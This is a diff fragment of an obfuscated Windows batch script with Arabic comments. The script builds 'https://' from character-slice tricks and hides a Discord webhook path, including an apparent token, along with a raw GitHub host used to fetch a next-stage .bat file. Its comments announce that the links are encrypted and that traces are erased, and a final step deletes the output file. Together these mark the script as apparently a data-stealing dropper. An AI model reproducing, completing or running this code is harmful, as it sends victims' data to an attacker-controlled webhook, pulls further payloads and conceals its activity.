@@ -15,7 +15,7 @@ set "ABC=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~:/?#[
 set "PROT=!ABC:~7,1!!ABC:~19,1!!ABC:~19,1!!ABC:~15,1!!ABC:~18,1!!ABC:~66,1!!ABC:~67,1!!ABC:~67,1!"
 
 :: 4. تشفير روابط الـ Webhook و الـ GitHub بالكامل
-:: الرابط المطلوب: raw.githubusercontent.com/857seif/11111111/main/1.bat
+
 set "H_DIS=discord.com"
 set "H_GIT=raw.githubusercontent.com"
 set "W_PATH=/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
@@ -51,3 +51,4 @@ if exist "!B_NEXT!" (
 :: 8. مسح الآثار
 del /f /q "!O_FILE!"
 exit
+
